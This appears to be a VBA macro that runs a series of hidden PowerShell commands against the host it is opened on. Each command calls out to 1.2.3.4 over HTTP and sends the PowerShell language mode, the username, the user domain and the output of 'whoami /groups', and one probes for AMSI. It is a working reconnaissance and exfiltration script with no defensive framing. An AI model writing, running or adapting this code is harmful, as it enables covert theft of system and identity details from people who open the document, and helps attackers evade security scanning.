Dim start As String
start = "powershell iwr $('http://1.2.3.4/start/')"
Shell start, vbHide

Dim ping As String
ping = "powershell ping -n 2 1.2.3.4"
Shell ping, vbHide

Dim getContext As String
getContext = "powershell iwr $('http://1.2.3.4/executioncontext/' + $ExecutionContext.SessionState.LanguageMode)"
Shell getContext, vbHide

Dim getuser As String
getuser = "powershell iwr $('http://1.2.3.4/username/' + $env:UserName)"
Shell getuser, vbHide

Dim getuserdomain As String
getuserdomain = "powershell iwr $('http://1.2.3.4/userdomain/' + $env:UserDomain)"
Shell getuserdomain, vbHide

Dim getgroups As String
getgroups = "powershell iwr $('http://1.2.3.4/groups/' + $(whoami /groups))"
Shell getgroups, vbHide

Dim getscan As String
getscan = "powershell iwr $('http://1.2.3.4/scaninterface/' + 'amsiutils')"
Shell getscan, vbHide

Dim ending As String
ending = "powershell iwr $('http://1.2.3.4/end/')"
Shell ending, vbHide
